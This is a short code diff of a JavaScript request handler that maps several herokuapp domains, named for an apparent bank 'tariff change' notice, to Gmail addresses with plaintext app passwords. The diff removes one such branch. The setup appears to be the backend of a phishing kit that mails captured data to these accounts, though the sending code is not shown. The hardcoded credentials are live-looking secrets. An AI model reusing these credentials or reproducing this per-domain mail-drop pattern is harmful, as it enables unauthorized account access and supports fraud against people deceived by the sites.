@@ -12,12 +12,6 @@ export default function handler(req, res) {
         email = 'orbitorbit799@gmail.com';
         pass = 'ahghpmbdwokimqim'; 
 
-
-    } else if(url == 'per-ubahan-tarif.herokuapp.com'){
-        email = 'qqq66195@gmail.com';
-        pass = 'gsnyrcjtylrepjdg';
-
-
     } else if(url == 'ubah-tarif.herokuapp.com'){
         email = 'alamalam312zx@gmail.com' ;
         pass = 'kgyvskkowvhosxrj' ;
